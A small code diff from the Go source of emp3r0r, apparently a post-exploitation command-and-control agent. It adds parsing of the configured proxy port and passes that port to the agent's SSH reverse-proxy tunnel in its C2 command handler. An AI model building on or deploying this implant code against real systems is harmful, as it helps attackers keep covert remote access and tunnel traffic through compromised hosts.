@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strconv"
 	"time"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
@@ -90,7 +91,14 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			go tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort, RuntimeConfig.Password, emp3r0r_data.MagicString)
 			util.TakeABlink() // wait for KCP to start
 		}
+		proxyPort, a2iErr := strconv.Atoi(RuntimeConfig.Emp3r0rProxyServerPort)
+		if a2iErr != nil {
+			out = fmt.Sprintf("Error: %v", a2iErr)
+			cancel()
+			return
+		}
 		if err = tun.SSHReverseProxyClient(targetAddrWithPort, RuntimeConfig.Password,
+			proxyPort,
 			&ReverseConns,
 			emp3r0r_data.ProxyServer,
 			ctx, cancel); err != nil {
